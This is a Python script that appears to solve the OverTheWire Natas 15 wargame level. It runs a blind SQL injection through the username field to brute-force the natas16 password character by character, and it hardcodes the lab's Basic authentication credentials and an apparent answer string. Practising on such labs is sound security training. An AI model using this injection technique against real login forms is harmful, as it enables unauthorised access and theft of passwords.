import requests
from bs4 import BeautifulSoup

correct = 'hpkjkyvilqctew33qmuxl6edvfmw4sgo'
pw = ''
possibilities = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
for j in range(32):
    headers = {"Authorization": "Basic bmF0YXMxNTpTZHFJcUJzRmN6M3lvdGxOWUVyWlNad2Jsa20wbHJ2eA==", "Referer": "http://natas15.natas.labs.overthewire.org/index.php"}
    text = ''
    i = -1
    while (not text.startswith("This user exis")):
        i+=1
        data = {"username": 'natas16" AND BINARY substring(password,1,'+str(len(pw)+1)+') = "'+pw+possibilities[i]}
        result = requests.post("http://natas15.natas.labs.overthewire.org", headers=headers, data=data)
        soup = BeautifulSoup(result.content, "html.parser")
        div = soup.find('div', id='content')
        text = div.get_text(separator='\n', strip=True)
        print(f"Try: {possibilities[i]}")
        print(text)
    print(f"Password: {pw+possibilities[i]}")
    pw += possibilities[i]